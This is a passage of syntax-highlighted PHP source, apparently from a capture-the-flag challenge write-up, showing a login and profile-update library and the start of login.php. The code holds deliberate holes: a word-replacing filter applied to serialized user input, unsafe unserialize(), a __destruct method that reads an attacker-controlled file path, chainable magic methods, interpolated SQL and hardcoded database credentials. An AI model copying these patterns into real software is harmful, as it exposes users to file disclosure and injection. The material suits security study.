punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'insert'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"alter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token operator\">=</span><span class=\"token variable\">$mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select id,password from user where username=?'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你的ID是\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你好！\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$Info</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getNewinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token variable\">$updateAction</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Info</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"update user SET age=<span class=\"token interpolation\"><span class=\"token variable\">$age</span></span>,nickname=<span class=\"token interpolation\"><span class=\"token variable\">$nickname</span></span> where id=\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// 这个功能还没有写完 先占坑</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getNewInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nickname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 危</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">}</span>   </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$newinfo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token variable\">$newInfo</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token variable\">$upDate</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$hostname</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbuser</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbpass</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$database</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$mysqli</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token comment\">// 还没来得及写</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>login.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>login.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 